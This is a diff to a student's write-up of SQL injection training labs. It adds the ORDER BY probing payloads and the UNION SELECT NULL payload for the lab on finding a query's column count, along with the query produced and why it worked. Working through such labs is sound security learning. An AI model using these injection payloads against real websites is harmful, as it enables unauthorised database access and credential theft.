@@ -51,12 +51,24 @@ UNION SELECT combined product results with usernames and passwords from the user
 **Result:** Lab solved. Retrieved the administrator credentials and successfully logged in.
 
 ## Lab 4 – Determine the Number of Columns
+**Payloads tested:**
+- `Gifts' ORDER BY 1--` – Worked
+- `Gifts' ORDER BY 2--` – Worked
+- `Gifts' ORDER BY 3--` – Worked
+- `Gifts' ORDER BY 4--` – Error
 
-**Payload:**
+**Final payload:** `Gifts' UNION SELECT NULL,NULL,NULL--`
 
-**SQL query produced:**
+**SQL query produced (approximate):**
+
+SELECT col1, col2, col3 FROM products
+WHERE category = 'Gifts'
+UNION SELECT NULL, NULL, NULL--';
 
 **Why it worked:**
+ORDER BY 4 caused an error, while ORDER BY 3 worked. This showed that the query returns exactly 3 columns. The UNION SELECT statement succeeded because it also returned 3 columns.
+
+**Result:** Lab solved successfully.
 
 ## Lab 5 – Find a Column Containing Text
 
